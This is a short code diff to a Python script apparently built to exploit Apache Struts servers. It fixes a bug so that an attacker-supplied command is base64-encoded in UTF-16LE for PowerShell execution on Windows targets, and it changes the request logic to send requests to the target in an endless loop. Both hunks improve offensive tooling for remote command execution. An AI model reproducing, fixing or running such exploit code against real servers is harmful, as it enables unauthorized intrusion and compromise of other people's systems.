@@ -68,6 +68,7 @@ class struts:
 			shell = "windows"
 			ext = "exe"
 			if self.command is not None:
+				cmd = self.command
 				cmd = b64encode(cmd.encode('UTF-16LE')).decode()
 			if self.shell == "1":
 				cmd = self.pwrsh()
@@ -136,8 +137,12 @@ class struts:
 					sys.exit()
 
 		else:
-			r = requests.get(URL, headers=headers)
-			exit()
+			while True:
+				try:
+					r = requests.get(URL, headers=headers)
+				except KeyboardInterrupt:
+					print("Bye")
+					sys.exit()
 
 def main():
 	parser = OptionParser()
